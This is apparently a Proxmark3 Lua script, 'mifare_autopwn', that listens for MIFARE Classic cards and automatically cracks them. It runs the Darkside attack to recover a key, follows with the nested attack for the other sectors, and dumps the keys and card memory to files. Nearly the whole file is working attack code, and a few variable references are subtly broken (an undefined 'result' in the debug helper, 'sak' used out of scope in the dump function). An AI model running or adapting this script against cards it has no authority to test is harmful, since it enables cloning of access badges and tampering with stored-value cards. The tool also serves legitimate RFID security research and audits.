local getopt = require('getopt')
local lib14a = require('read14a')
local cmds = require('commands')
local utils = require('utils')

example = "script run mifare_autopwn"
author = "Martin Holst Swende"
desc =
[[
This is a script which automates cracking and dumping mifare classic cards. It sets itself into
'listening'-mode, after which it cracks and dumps any mifare classic card that you
place by the device.

Arguments:
    -h          this help
    -d          debug logging on
    -k          known key for Sector 0 ,  keytype A


Output files from this operation:
    <uid>.eml       - emulator file
    <uid>.html      - html file containing card data
    dumpkeys.bin    - keys are dumped here. OBS! This file is volatile, as other commands overwrite it sometimes.
    dumpdata.bin    - card data in binary form. OBS! This file is volatile, as other commands (hf mf dump) overwrite it.

]]

-------------------------------
-- Some utilities
-------------------------------
local DEBUG = false
---
-- A debug printout-function
local function dbg(args)
    if not DEBUG then return end

    if type(args) == 'table' then
        local i = 1
        while result[i] do
            dbg(result[i])
            i = i+1
        end
    else
        print('###', args)
    end
end
---
-- This is only meant to be used when errors occur
local function oops(err)
    print("ERROR: ",err)
    return nil,err
end
---
-- Usage help
local function help()
    print(desc)
    print("Example usage")
    print(example)
end
---
-- Waits for a mifare card to be placed within the vicinity of the reader.
-- @return if successfull: an table containing card info
-- @return if unsuccessfull : nil, error
local function wait_for_mifare()
    while not core.ukbhit() do
        res, err = lib14a.read()
        if res then return res end
        -- err means that there was no response from card
    end
    return nil, "Aborted by user"
end

local function nested(key,sak)
    local typ = 1
    if 0x18 == sak then --NXP MIFARE Classic 4k | Plus 4k | Ev1 4k
        typ = 4
    elseif 0x08 == sak then -- NXP MIFARE CLASSIC 1k | Plus 2k | Ev1 1K
        typ = 1
    elseif 0x09 == sak then -- NXP MIFARE Mini 0.3k
        typ = 0
    elseif 0x10 == sak then-- "NXP MIFARE Plus 2k"
        typ = 2
    elseif 0x01 == sak then-- "NXP MIFARE TNP3xxx 1K"
        typ = 1
    else
        print("I don't know how many sectors there are on this type of card, defaulting to 16")
    end
    local cmd = string.format("hf mf nested %d 0 A %s d", typ, key)
    core.console(cmd)
end

local function dump(uid, numsectors)
    dbg('dumping tag memory')

    local typ = 1
    if 0x18 == sak then --NXP MIFARE Classic 4k | Plus 4k | Ev1 4k
        typ = 4
    elseif 0x08 == sak then -- NXP MIFARE CLASSIC 1k | Plus 2k | Ev1 1K
        typ = 1
    elseif 0x09 == sak then -- NXP MIFARE Mini 0.3k
        typ = 0
    elseif 0x10 == sak then-- "NXP MIFARE Plus 2k"
        typ = 2
    elseif 0x01 == sak then-- "NXP MIFARE TNP3xxx 1K"
        typ = 1
    end

    if utils.confirm('Do you wish to create a memory dump of tag?') then

        local dumpfile = 'hf-mf-'..uid..'-data'

        local dmp = ('hf mf dump %s f %s'):format(typ, dumpfile)
        core.console(dmp)

        -- Save the global args, those are *our* arguments
        local myargs = args
        -- Set the arguments for htmldump script
        args =('-i %s.bin -o %s.html'):format(dumpfile, dumpfile)
        -- call it
        require('htmldump')

        -- Set back args. Not that it's used, just for the karma...
        args = myargs
    end
end
--
-- performs a test if tag nonce uses weak or hardend prng
local function perform_prng_test()
    local isweak = core.detect_prng()
    if isweak == 1 then
        dbg('PRNG detection : WEAK nonce detected')
    elseif isweak == 0 then
        dbg('PRNG detection : HARDEND nonce detected')
    else
        dbg('PRNG detection : failed')
    end
    return isweak
end
---
-- The main entry point
local function main(args)

    local verbose, exit, res, uid, err, _, sak
    local seen_uids = {}
    local key = ''
    local print_message = true
    -- Read the parameters
    for o, a in getopt.getopt(args, 'hdk:') do
        if o == "h" then help() return end
        if o == "d" then DEBUG = true end
        if o == 'k' then key = a end
    end

    while not exit do
        if print_message then
            print("Waiting for card or press any key to stop")
            print_message = false
        end
        res, err = wait_for_mifare()
        if err then return oops(err) end
        -- Seen already?
        uid = res.uid
        sak = res.sak

        if not seen_uids[uid] then
            -- Store it
            seen_uids[uid] = uid

            -- check if PRNG is WEAK
            if perform_prng_test() == 1 then
                print("Card found, commencing crack on UID", uid)

                if #key == 12 then
                    print("Using key: "..key);
                else
                    -- Crack it
                    local cnt
                    err, res = core.mfDarkside()
                    if     err == -1 then return oops("Button pressed. Aborted.")
                    elseif err == -2 then return oops("Card is not vulnerable to Darkside attack (doesn't send NACK on authentication requests).")
                    elseif err == -3 then return oops("Card is not vulnerable to Darkside attack (its random number generator is not predictable).")
                    elseif err == -4 then return oops([[
        Card is not vulnerable to Darkside attack (its random number generator seems to be based on the wellknown
        generating polynomial with 16 effective bits only, but shows unexpected behaviour.]])
                    elseif err == -5 then return oops("Aborted via keyboard.")
                    end
                    -- The key is actually 8 bytes, so a
                    -- 6-byte key is sent as 00XXXXXX
                    -- This means we unpack it as first
                    -- two bytes, then six bytes actual key data
                    -- We can discard first and second return values
                    _,_,key = bin.unpack("H2H6",res)
                    print("Found valid key: "..key);
                end
                -- Use nested attack
                nested(key, sak)
                -- Dump info
                dump(uid, sak)

                if #key == 12 then exit = true end
            else
                print("Card found, darkside attack useless PRNG hardend on UID", uid)
            end
            print_message = true
        end
    end
end

-- Call the main
main(args)
